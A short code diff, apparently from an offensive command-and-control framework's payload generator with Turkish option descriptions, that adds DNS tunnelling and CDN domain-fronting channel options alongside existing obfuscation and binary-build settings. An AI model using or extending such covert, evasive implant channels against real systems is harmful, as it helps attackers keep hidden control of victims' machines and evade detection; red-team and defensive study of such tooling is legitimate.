@@ -46,6 +46,9 @@ class Payload(BaseModule):
             "OUTPUT":          Option("OUTPUT",          "",          False, "Payload'ı dosyaya kaydet (örn: /tmp/chimera.py).", completion_dir="."),
             "RECONNECT_DELAY": Option("RECONNECT_DELAY", 5,           False, "Yeniden bağlanma bekleme süresi (sn)."),
             "MAX_RECONNECT":   Option("MAX_RECONNECT",   -1,          False, "Maksimum bağlanma denemesi (-1 = sınırsız)."),
+            "CHANNEL_TYPE":    Option("CHANNEL_TYPE",    "https",     False, "İletişim kanalı tipi.", choices=["https", "dns", "fronting", "auto"]),
+            "DNS_DOMAIN":      Option("DNS_DOMAIN",      "",          False, "DNS tünelleme domain'i (ör: c2.example.com)."),
+            "FRONTING_DOMAIN": Option("FRONTING_DOMAIN",  "",          False, "Domain fronting CDN host'u (ör: cdn.example.com)."),
             "STRIP_COMMENTS":  Option("STRIP_COMMENTS",  False,       False, "Yorum satırlarını temizle.", choices=[True, False]),
             "OBFUSCATE":       Option("OBFUSCATE",       False,       False, "AST rename + XOR string şifreleme + junk code uygula.", choices=[True, False]),
             "BUILD":           Option("BUILD",           False,       False, "PyInstaller ile çalıştırılabilir ikili (binary) dosyaya dönüştür.", choices=[True, False]),
@@ -73,6 +76,9 @@ class Payload(BaseModule):
         output          = self.Options["OUTPUT"].value
         reconnect_delay = int(self.Options["RECONNECT_DELAY"].value or 5)
         max_reconnect   = int(self.Options["MAX_RECONNECT"].value or -1)
+        channel_type    = str(self.Options["CHANNEL_TYPE"].value or "https")
+        dns_domain      = str(self.Options["DNS_DOMAIN"].value or "")
+        fronting_domain = str(self.Options["FRONTING_DOMAIN"].value or "")
         strip_comments  = self._to_bool(self.Options["STRIP_COMMENTS"].value)
         obfuscate       = self._to_bool(self.Options["OBFUSCATE"].value)
         build_bin       = self._to_bool(self.Options["BUILD"].value)
@@ -94,6 +100,9 @@ class Payload(BaseModule):
             lport=int(lport),
             reconnect_delay=reconnect_delay,
             max_reconnect=max_reconnect,
+            channel_type=channel_type,
+            dns_domain=dns_domain,
+            fronting_domain=fronting_domain,
             output_path=output if output else None,
             agent_source_path=agent_path,
             strip_comments=strip_comments,
